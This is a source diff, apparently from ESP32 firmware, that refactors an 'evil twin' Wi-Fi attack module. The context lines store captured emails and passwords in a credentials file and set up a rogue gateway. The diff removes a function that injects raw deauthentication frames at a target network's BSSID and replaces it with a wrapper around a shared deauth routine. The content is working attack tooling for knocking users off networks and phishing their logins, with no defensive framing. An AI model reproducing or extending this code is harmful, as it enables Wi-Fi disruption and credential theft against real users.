@@ -1,8 +1,5 @@
 // pid PID::EVIL_TWIN
 
-#include <LittleFS.h>
-#include "esp_wifi.h"
-
 const char* EVIL_TWIN_CREDS_FILE = "/evil_twin_creds.txt";
 IPAddress EVIL_TWIN_GATEWAY(172, 0, 0, 1);
 IPAddress EVIL_TWIN_SUBNET(255, 255, 255, 0);
@@ -31,12 +28,9 @@ void evilTwinSaveCreds(String email, String password) {
 	Serial.println("Evil Twin: captured " + email);
 }
 
-void evilTwinSendDeauthFrame(const uint8_t* bssid, int chan) {
-	esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
-	delay(50);
-	memcpy(&deauth_frame[10], bssid, 6);
-	memcpy(&deauth_frame[16], bssid, 6);
-	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false));
+// evilTwinSendDeauthFrame — thin wrapper kept for local readability
+static void evilTwinSendDeauthFrame(const uint8_t* bssid, int chan) {
+	deauthSendFrame(bssid, chan);
 }
 
 // Shared captive portal detection endpoints (same as evil portal)
